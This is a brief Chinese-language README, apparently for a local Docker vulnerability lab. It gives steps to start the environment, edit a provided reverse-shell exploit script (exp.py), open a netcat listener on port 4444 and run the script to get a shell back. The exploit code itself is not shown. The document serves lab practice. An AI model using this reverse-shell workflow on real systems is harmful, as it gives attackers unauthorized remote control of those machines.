开启环境：
```
docker compose up -d
```
访问页面：
```
http://localhost:8000
```


文件夹内提供了反弹shell的exp.py
但是需要修改：
将172.18.0.1改为host.docker.internal
将80改为4444

然后监听：
```
nc -lv 4444
```
执行exp.py：
```
python3 exp.py
```
即可反弹shell
